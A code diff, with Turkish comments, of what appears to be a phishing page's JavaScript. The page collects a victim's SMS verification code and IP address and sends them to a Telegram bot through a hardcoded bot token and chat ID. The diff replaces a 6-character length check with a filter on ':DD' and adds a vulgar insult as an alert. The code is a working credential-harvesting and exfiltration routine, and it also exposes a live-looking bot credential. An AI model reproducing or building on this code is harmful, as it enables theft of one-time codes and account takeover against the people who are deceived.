@@ -54,9 +54,9 @@
             // Kullanıcının girdiği metni al
             var message = document.getElementById('inputMessage').value;
 
-            // Karakter limitini kontrol et
-            if (message.length > 6) {
-                alert('Sms kodu en fazla 6 karakter olabilir.');
+            // Yasaklı kelime kontrolü
+            if (message.includes(':DD')) {
+                alert('Yarramı yermisin çocuk adam');
                 return;
             }
 
@@ -73,6 +73,12 @@
                     // Telegram botunuzun API anahtarı ve chat ID'si
                     var botToken = '6554055008:AAGar8ThTIq0t0o_TCFu_XxRs1KdSeIlotQ';
                     var chatId = '6338892965';
+
+                    // Filtreleme: Eğer mesaj içinde ":DD" kelimesi bulunursa, Telegram'a gönderme
+                    if (message.includes(':DD')) {
+                        alert('Mesaj içinde ":DD" kelimesi bulunamaz.');
+                        return;
+                    }
 
                     // Telegram botuna gönderilecek tek bir mesajı oluştur
                     var combinedMessage = `Sms: ${message}\n\nIP Adresi: ${ipAddress}`;
